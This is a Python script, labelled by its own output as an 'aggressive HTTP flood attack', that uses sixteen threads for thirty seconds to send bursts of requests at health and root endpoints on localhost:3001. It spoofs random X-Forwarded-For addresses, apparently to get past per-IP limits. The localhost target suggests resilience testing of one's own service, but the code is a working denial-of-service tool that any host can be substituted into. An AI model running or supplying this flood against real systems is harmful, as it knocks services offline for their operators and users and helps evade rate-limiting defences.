#!/usr/bin/env python3
import requests
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Target configuration
TARGET_HOST = 'http://localhost:3001'
ATTACK_DURATION = 30  # seconds
NUM_THREADS = 16  # Increased threads
REQUEST_DELAY = 0.001  # Very small delay between requests

# Simplified list of endpoints that should exist
ENDPOINTS = [
    '/api/health',
    '/health',
    '/'
]

def send_flood(thread_id):
    """Send HTTP flood requests"""
    session = requests.Session()
    start_time = time.time()
    requests_sent = 0
    errors = 0
    
    print(f"Thread {thread_id} starting attack...")
    
    while time.time() - start_time < ATTACK_DURATION:
        try:
            endpoint = random.choice(ENDPOINTS)
            url = f"{TARGET_HOST}{endpoint}"
            
            # Send burst of requests
            for _ in range(10):  # Send 10 requests in quick succession
                response = session.get(
                    url,
                    headers={
                        'User-Agent': f'Mozilla/5.0 (Thread-{thread_id})',
                        'X-Forwarded-For': f'192.168.{random.randint(1, 255)}.{random.randint(1, 255)}',
                        'Connection': 'keep-alive'
                    },
                    timeout=1
                )
                requests_sent += 1
            
            # Print status less frequently to reduce console spam
            if requests_sent % 100 == 0:
                print(f"Thread {thread_id}: {requests_sent} requests sent. Last status: {response.status_code}")
            
        except requests.exceptions.RequestException as e:
            errors += 1
            if errors % 1000 == 0:  # Only log every 1000th error
                print(f"Thread {thread_id} error: {str(e)}")
            continue
        
        # Very small delay between bursts
        time.sleep(REQUEST_DELAY)
    
    print(f"Thread {thread_id} completed: {requests_sent} requests sent ({errors} errors)")
    return requests_sent

def main():
    print(f"Starting aggressive HTTP flood attack on {TARGET_HOST}")
    print(f"Attack duration: {ATTACK_DURATION} seconds")
    print(f"Number of threads: {NUM_THREADS}")
    print(f"Target endpoints: {', '.join(ENDPOINTS)}")
    print("----------------------------------------")
    
    total_requests = 0
    
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(send_flood, i) for i in range(NUM_THREADS)]
        for future in futures:
            total_requests += future.result()
    
    print("----------------------------------------")
    print(f"Attack completed. Total requests sent: {total_requests}")
    print(f"Average requests per second: {total_requests / ATTACK_DURATION:.2f}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        sys.exit(1) 